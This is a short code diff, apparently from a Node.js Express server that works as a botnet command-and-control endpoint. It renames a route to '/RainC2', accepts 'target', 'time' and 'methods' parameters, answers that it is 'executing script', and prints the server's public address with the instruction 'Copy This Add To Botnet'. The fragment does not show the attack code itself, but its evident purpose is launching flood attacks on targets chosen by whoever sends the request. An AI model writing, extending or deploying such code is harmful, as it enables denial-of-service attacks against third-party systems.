@@ -3,7 +3,7 @@ const app = express();const port = process.env.PORT || process.env.SERVER_PORT |
 async function fetchData() {
   const response = await fetch('https://httpbin.org/get');  const data = await response.json();  console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);  return data;}
 
-app.get('/Sutrator', (req, res) => {
+app.get('/RainC2', (req, res) => {
   const { target, time, methods } = req.query;
   res.status(200).json({
     message: 'API request received. Executing script shortly.',
